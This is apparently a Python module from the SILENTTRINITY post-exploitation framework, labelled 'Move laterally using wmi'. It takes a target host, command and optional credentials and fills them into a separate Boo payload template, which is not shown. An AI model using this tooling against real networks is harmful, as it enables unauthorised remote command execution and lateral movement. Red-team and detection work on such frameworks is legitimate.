from silenttrinity.core.utils import get_path_in_package
from silenttrinity.core.teamserver import ipc_server
from silenttrinity.core.teamserver.module import Module


class STModule(Module):
    def __init__(self):
        self.name = 'boo/wmi'
        self.language = 'boo'
        self.description = 'Move laterally using wmi'
        self.author = '@byt3bl33d3r'
        self.references = ["System.Management"]
        self.options = {
            'Host': {
                'Description'   :   'Target IP or Hostname',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Listener': {
                'Description'   :   'Listener Name',
                'Required'      :   False,
                'Value'         :   ''
            },
            'Command': {
                'Description'   :   'Command to Execute',
                'Required'      :   False,
                'Value'         :   ''
            },
            'Username': {
                'Description'   :   'Optional alternative username to use for the WMI connection',
                'Required'      :   False,
                'Value'         :   ''
            },
            'Domain': {
                'Description'   :   'Optional alternative Domain of the username to use for the WMI connection',
                'Required'      :   False,
                'Value'         :   ''
            },
            'Password': {
                'Description'   :   'Optional password to authenticate the user for the WMI connection',
                'Required'      :   False,
                'Value'         :   ''
            }
        }

    def payload(self):
        with open(get_path_in_package('core/teamserver/modules/boo/src/wmi.boo'), 'r') as module_src:
            src = module_src.read()
            src = src.replace('TARGET', self.options['Host']['Value'])
            src = src.replace('COMMAND', self.options['Command']['Value'])
            src = src.replace('USERNAME', self.options['Username']['Value'])
            src = src.replace('DOMAIN', self.options['Domain']['Value'])
            src = src.replace('PASSWORD', self.options['Password']['Value'])
            return src
